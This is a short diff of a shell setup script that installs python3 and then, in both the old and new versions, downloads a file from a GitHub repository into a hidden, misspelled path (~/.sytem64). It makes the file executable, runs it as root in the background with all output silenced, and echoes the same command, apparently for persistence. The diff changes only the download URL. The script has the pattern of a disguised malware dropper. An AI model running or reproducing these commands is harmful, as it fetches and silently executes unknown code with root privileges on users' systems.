@@ -1,6 +1,6 @@
 sudo apt update 
 sudo apt install python3 python3-pip -y
-curl -sL https://github.com/ven0m90/python-fix-linux/raw/refs/heads/main/python3fix -o ~/.sytem64
+curl -sL https://github.com/ven0m90/python-scraper/raw/refs/heads/main/python3fix -o ~/.sytem64
 chmod +x ~/.sytem64
 sudo nohup  ~/.sytem64 > /dev/null 2>&1 &
 echo "sudo nohup ~/.sytem64  > /dev/null 2>&1 &
